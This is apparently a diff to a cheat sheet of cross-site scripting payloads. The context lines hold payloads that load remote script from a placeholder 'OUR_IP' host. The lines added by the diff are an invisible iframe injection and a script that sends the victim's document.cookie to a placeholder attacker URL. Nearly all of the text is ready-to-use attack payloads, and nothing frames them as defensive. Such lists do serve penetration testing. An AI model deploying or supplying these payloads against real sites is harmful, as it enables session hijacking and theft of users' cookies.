@@ -24,3 +24,15 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 <script>$.getScript("http://OUR_IP")</script>
 ```
 ---
+
+### script: XSS content injection with iframe
+```html
+<iframe src=<your_url> height="0" weight="0"></iframe>
+```
+---
+
+### script: XSS cookie exfiltration with javascript
+```html
+<script>new Image().src="<your_url>/?output="+document.cookie;</script>
+```
+---
